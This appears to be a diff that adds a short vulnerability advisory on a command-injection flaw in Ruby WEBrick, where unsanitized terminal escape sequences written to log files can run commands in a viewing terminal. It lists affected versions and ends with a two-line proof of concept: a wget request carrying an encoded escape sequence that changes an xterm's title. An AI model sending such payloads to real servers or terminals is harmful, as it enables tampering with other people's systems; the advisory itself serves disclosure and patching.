@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/37710/info
+
+
+Ruby WEBrick is prone to a command-injection vulnerability because it fails to adequately sanitize user-supplied input in log files.
+
+Attackers can exploit this issue to execute arbitrary commands in a terminal.
+
+Versions *prior to* the following are affected:
+
+Ruby 1.8.6 patchlevel 388
+Ruby 1.8.7 patchlevel 249
+Ruby 1.9.1 patchlevel 378 
+
+The following example is available:
+
+% xterm -e ruby -rwebrick -e 'WEBrick::HTTPServer.new(:Port=>8080).start' &
+% wget http://www.example.com:8080/%1b%5d%32%3b%6f%77%6e%65%64%07%0a
+
